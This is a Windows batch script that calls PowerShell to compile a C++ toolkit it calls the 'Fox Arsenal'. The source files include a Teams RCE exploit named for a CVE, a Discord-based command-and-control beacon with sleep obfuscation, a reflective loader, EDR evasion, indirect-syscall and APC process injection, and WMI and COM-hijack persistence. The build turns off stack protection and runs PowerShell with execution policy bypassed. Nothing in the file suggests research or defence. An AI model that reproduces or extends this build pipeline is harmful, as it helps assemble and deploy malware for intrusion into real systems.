@echo off
setlocal

cd /d "%~dp0"
if not exist "bin" mkdir bin

echo [*] Starting Compilation of the Fox Arsenal...

:: Use PowerShell to safely resolve paths and compile, bypassing cmd.exe string parsing bugs
powershell -ExecutionPolicy Bypass -NoProfile -Command ^
"$ErrorActionPreference = 'Stop';" ^
"try {" ^
"  $sdkInc = (Get-ChildItem 'C:\Program Files (x86)\Windows Kits\10\Include' -Directory | Sort-Object Name -Descending | Select-Object -First 1).FullName;" ^
"  $sdkLib = (Get-ChildItem 'C:\Program Files (x86)\Windows Kits\10\Lib' -Directory | Sort-Object Name -Descending | Select-Object -First 1).FullName;" ^
"  $msvc = (Get-ChildItem 'C:\Program Files (x86)\Microsoft Visual Studio\18\BuildTools\VC\Tools\MSVC' -Directory | Sort-Object Name -Descending | Select-Object -First 1).FullName;" ^
"  $inc = \"/I`\"$msvc\include`\" /I`\"$sdkInc\um`\" /I`\"$sdkInc\shared`\" /I`\"$sdkInc\ucrt`\"\";" ^
"  $lib = \"/LIBPATH:`\"$msvc\lib\x64`\" /LIBPATH:`\"$sdkLib\um\x64`\" /LIBPATH:`\"$sdkLib\ucrt\x64`\"\";" ^
"  Write-Host '[*] Resolved MSVC:' $msvc;" ^
"  Write-Host '[*] Resolved SDK:' $sdkInc;" ^
"  $files = @(" ^
"    @{ out='teams_rce.exe'; src='cve_2025_23198_teams_rce.cpp'; sub='CONSOLE' }," ^
"    @{ out='beacon_v2.exe'; src='discord_c2_v2\main_beacon_v2.cpp discord_c2_v2\sleep_ekko.cpp'; sub='WINDOWS' }," ^
"    @{ out='loader.exe'; src='discord_c2_v2\reflective_loader.cpp'; sub='WINDOWS' }," ^
"    @{ out='evasion.exe'; src='discord_c2_v2\evasion_native.cpp'; sub='CONSOLE' }," ^
"    @{ out='syscalls.exe'; src='discord_c2_v2\injection_indirect_syscalls.cpp'; sub='CONSOLE' }," ^
"    @{ out='apc_inject.exe'; src='discord_c2_v2\injection_apc.cpp'; sub='CONSOLE' }," ^
"    @{ out='persist_wmi.exe'; src='discord_c2_v2\persistence_wmi.cpp'; sub='CONSOLE' }," ^
"    @{ out='persist_com.exe'; src='discord_c2_v2\persistence_com_hijack.cpp'; sub='CONSOLE' }" ^
"  );" ^
"  foreach ($f in $files) {" ^
"    Write-Host \"[*] Compiling $($f.out)...\";" ^
"    $cmd = \"cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG $inc /Tc $($f.src) /link $lib /OUT:bin\$($f.out) /SUBSYSTEM:$($f.sub) /MACHINE:x64\";" ^
"    Invoke-Expression $cmd;" ^
"  }" ^
"} catch {" ^
"  Write-Host '[-] Build failed:' $_.Exception.Message;" ^
"}"

del *.obj >nul 2>&1
echo [*] Compilation complete. Check the 'bin' folder.
